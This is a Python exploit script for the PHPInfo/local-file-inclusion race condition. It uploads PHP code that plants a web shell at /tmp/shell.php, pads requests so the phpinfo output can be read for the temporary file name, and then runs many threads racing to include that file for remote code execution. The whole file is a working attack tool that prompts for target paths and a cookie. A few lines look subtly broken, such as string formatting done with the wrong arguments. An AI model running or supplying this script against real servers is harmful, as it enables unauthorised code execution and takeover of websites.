import sys
import threading
import socket

def setup(host, port, path1, path2, cookie):
    TAG = "Security Test"
    PAYLOAD = f"""%s\r
<?php $c=fopen('/tmp/shell.php','w');fwrite($c,'<?php passthru($_GET["f"]);?>');?>\r""" % TAG
    REQ1_DATA = f"""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
{PAYLOAD}
-----------------------------7dbff1ded0714--\r"""
    padding = "A" * 5000
    REQ1 = f"""POST {path1}a={padding} HTTP/1.1\r
Cookie: {cookie}; othercookie={padding}\r
HTTP_ACCEPT: {padding}\r
HTTP_USER_AGENT: {padding}\r
HTTP_ACCEPT_LANGUAGE: {padding}\r
HTTP_PRAGMA: {padding}\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: {len(REQ1_DATA)}\r
Host: {host}\r
\r
{REQ1_DATA}"""
    LFIREQ = f"""GET {path2}%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: {host}\r
\r
\r
"""
    print("\nSample output According to your input \n")
    print("PHPInfo final location: \n")
    print(f"""POST {path1}a={padding} HTTP/1.1""")
    print("\n\nLFI final location: \n")
    print(LFIREQ % ("/tmp/phpdWOBHP", host))
    print("-=" * 30)

    return (REQ1, TAG, LFIREQ)

def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((host, port))
    s2.connect((host, port))
    s.send(phpinforeq.encode())
    d = b""
    while len(d) < offset:
        d += s.recv(offset)
    try:
        i = d.index(b"[tmp_name] =>")
        fn = d[i+17:i+31].decode()
    except ValueError:
        return None

    s2.send(lfireq % (fn, host).encode())
    d = s2.recv(409600).decode()
    s.close()
    s2.close()
    if tag in d:
        return fn

counter = 0

class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock = l
        self.maxattempts = m
        self.args = args

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter += 1

            try:
                x = phpInfoLFI(*self.args)
                if self.event.is_set():
                    break
                if x:
                    print("\n\nHurray!!! Shell created in /tmp/shell.php")
                    self.event.set()

            except socket.error:
                return

def getOffset(host, port, phpinforeq):
    """Gets offset of tmp_name in the php output"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(phpinforeq.encode())

    d = b""
    while True:
        i = s.recv(4096)
        d += i
        if not i:
            break
        if i.endswith(b"0\r\n\r\n"):
            break
    s.close()
    i = d.find(b"[tmp_name] =>")
    if i == -1:
        raise ValueError("No tmp_name in phpinfo output")

    print(f"found {d[i:i+10].decode()} at {i}")
    return i + 256

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} host [port] [threads]")
        sys.exit(1)

    try:
        host = socket.gethostbyname(sys.argv[1])
    except socket.error as e:
        print(f"Error with hostname {sys.argv[1]}: {e}")
        sys.exit(1)

    port = 80
    try:
        port = int(sys.argv[2])
    except IndexError:
        pass
    except ValueError as e:
        print(f"Error with port {sys.argv[2]}: {e}")
        sys.exit(1)

    poolsz = 10
    try:
        poolsz = int(sys.argv[3])
    except IndexError:
        pass
    except ValueError as e:
        print(f"Error with poolsz {sys.argv[3]}: {e}")
        sys.exit(1)

    path1 = input("PHPInfo location: ")
    print("\n")
    path2 = input("LFI location ex:(/chall.php?a=../../..): ")
    print("\n")
    cookie = input("Give Cookie ex:(PHPSESSID=hey): ")
    if path1.endswith(".php"):
        path1 += "?"
    else:
        path1 += "&"

    print("\n\nRCE With PHPInfo() using Race-Condition\n")
    print("-=" * 30)

    reqphp, tag, reqlfi = setup(host, port, path1, path2, cookie)
    print("\n\nFinding tmp_name...\n")
    offset = getOffset(host, port, reqphp)
    sys.stdout.flush()

    maxattempts = 50000
    e = threading.Event()
    l = threading.Lock()

    print(f"\nThread working on the same:  {poolsz}...")
    sys.stdout.flush()

    tp = []
    for _ in range(poolsz):
        tp.append(ThreadWorker(e, l, maxattempts, host, port, reqphp, offset, reqlfi, tag))

    for t in tp:
        t.start()
    try:
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                sys.stdout.write(f"\r{counter: 4d} / {maxattempts: 4d}")
                sys.stdout.flush()
                if counter >= maxattempts:
                    break
        print()
        if e.is_set():
            print("Now you are able to do RCE!!!  \\m/")
        else:
            print(":(")
    except KeyboardInterrupt:
        print("\nTelling threads to shutdown...")
        e.set()

    print("\nShutting down...")
    for t in tp:
        t.join()

if __name__ == "__main__":
    print("Starting...")
    main()
